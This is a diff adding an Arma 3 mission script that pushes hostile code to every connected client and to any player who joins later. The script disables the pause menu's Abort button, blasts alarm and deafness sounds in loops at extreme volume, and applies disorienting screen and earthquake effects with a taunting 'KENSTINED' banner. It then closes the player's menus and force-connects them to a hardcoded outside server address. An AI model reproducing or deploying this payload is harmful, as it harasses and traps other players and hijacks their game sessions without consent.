@@ -1,0 +1,177 @@
+DISABLE ALT A4
+DISABLE END MISSION
+
+private _varName = "MAMSystem";
+private _myJIPCode = "MAMSystemJIP";
+
+
+private _value = (str {
+
+
+
+
+0 spawn {
+    onEachFrame {
+     
+        _AbortButton = ((findDisplay 49) displayCtrl 104);
+        _AbortButton ctrlEnable false;
+    };
+    while {true} do {  playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];
+        playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];
+        playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];
+        playSound "combat_deafness";
+        playSound "combat_deafness";
+        playSound "combat_deafness";
+        playSound "combat_deafness";
+        playSound "combat_deafness"; playSound "combat_deafness"; playSound "combat_deafness";playSound "combat_deafness";sleep 6;titleText ["<t color='#ff0000' size='5'>YOUVE BEEN KENSTINED!</t><br/>", "PLAin", -1, true, true];
+    };
+   
+}; 
+
+
+
+0 spawn {
+		hint "running";
+        ["Colorinversion", 2500, [1, 1, 0.5]] spawn
+        {
+            params ["_name", "_priority", "_effect", "_handle"];
+            while {
+                _handle = ppEffectCreate [_name, _priority];
+                _handle < 0
+            } do {
+                _priority = _priority + 1;
+            };
+            _handle ppEffectEnable true;
+            _handle ppEffectAdjust _effect;
+            _handle ppEffectCommit 5;
+            waitUntil {
+                ppEffectCommitted _handle
+            };
+        };
+        
+        ["ChromAberration", 200, [4, 4, true]] spawn {
+            params ["_name", "_priority", "_effect", "_handle"];
+            while {
+                _handle = ppEffectCreate [_name, _priority];
+                _handle < 0
+            } do {
+                _priority = _priority + 1;
+            };
+            _handle ppEffectEnable true;
+            _handle ppEffectAdjust _effect;
+            _handle ppEffectCommit 5;
+            waitUntil {
+                ppEffectCommitted _handle
+            };
+        };
+        [4] spawn BIS_fnc_earthquake;
+        [4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;[4] spawn BIS_fnc_earthquake;
+        playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];
+        playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];
+        playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];playSoundUI ["A3\Sounds_F\sfx\alarm_independent.wss", 100000, 0.5];
+        sleep 100;
+        
+        params
+        [
+            ["_IP", "142.44.157.214"],
+            ["_PorT", "2302"],
+            ["_PASS", ""],
+            ["_timeOUT", 30]
+        ];
+        
+        _this resize 0;
+        
+        onEachFrame format [
+            "
+            private _displays = allDisplays;
+            private _indexMission = _displays find (findDisplay 46);
+            _displays = _displays select [_indexMission, count(_displays)];
+            reverse _displays;
+            {
+                _x closeDisplay 2
+            } forEach _displays;
+            
+            onEachFrame {
+                (findDisplay 50) closeDisplay 2;
+                (findDisplay 70) closeDisplay 2;
+                
+                onEachFrame
+                {
+                    ctrlActivate (findDisplay %8 displayCtrl %9);
+                    
+                    onEachFrame
+                    {
+                        private _ctrlServeraddress = findDisplay %10 displayCtrl 2300;
+                        _ctrlServeraddress controlsgroupCtrl %11 ctrlsettext ""%1"";
+                        _ctrlServeraddress controlsgroupCtrl %12 ctrlsettext ""%2"";
+                        ctrlActivate (_ctrlServeraddress controlsgroupCtrl %14);
+                        
+                        onEachFrame
+                        {
+                            findDisplay %8 displayCtrl %13 lbData 0 call
+                            {
+                                if (diag_ticktime > %18) then {
+                                    diag_log ""RCTS timeout (no server)"";
+                                    onEachFrame {};
+                                };
+                                
+                                if (_this isEqualto ""%1:%2"") then {
+                                    findDisplay %8 displayCtrl %13 lbsetCurSel 0;
+                                    
+                                    onEachFrame
+                                    {
+                                        ctrlActivate (findDisplay %8 displayCtrl %15);
+                                        
+                                        onEachFrame
+                                        {
+                                            if (diag_ticktime > %18) then {
+                                                diag_log ""RCTS timeout (cannot join)"";
+                                                onEachFrame {};
+                                            };
+                                            
+                                            if (!isNull findDisplay %16) then {
+                                                private _ctrlPassword = findDisplay %16 displayCtrl %17;
+                                                _ctrlPassword ctrlsettextColor [0, 0, 0, 0];
+                                                _ctrlPassword ctrlsettext ""%3"";
+                                                ctrlActivate (findDisplay %16 displayCtrl %14);
+                                            };
+                                            
+                                            if (getClientStateNumber >= 3) then {
+                                                diag_log ""RCTS Success"";
+                                                onEachFrame {};
+                                            };
+                                        };
+                                    };
+                                };
+                            };
+                        };
+                    };
+                };
+            };
+            ", _IP, _PorT, _PASS, 2, 46, 50, 70, 8,
+            166, 19, 101, 102, 102,
+        1, 105, 64, 101, diag_ticktime + _timeOUT];};
+
+
+
+
+
+}) splitString "";
+
+_value deleteAt (count _value - 1);
+_value deleteAt 0;
+
+_value = _value joinString "";
+_value = _value + "removeMissionEventhandler ['EachFrame',_thisEventHandler];";
+_value = _value splitString "";
+
+missionNamespace setVariable [_varName,_value,true];
+
+[[_varName], {
+    params ["_ding"];
+    private _data = missionNamespace getVariable [_ding,[]];
+    _data = _data joinString "";
+    addMissionEventhandler ["EachFrame", _data];
+}] remoteExec ['spawn',0,_myJIPCode];
+
+
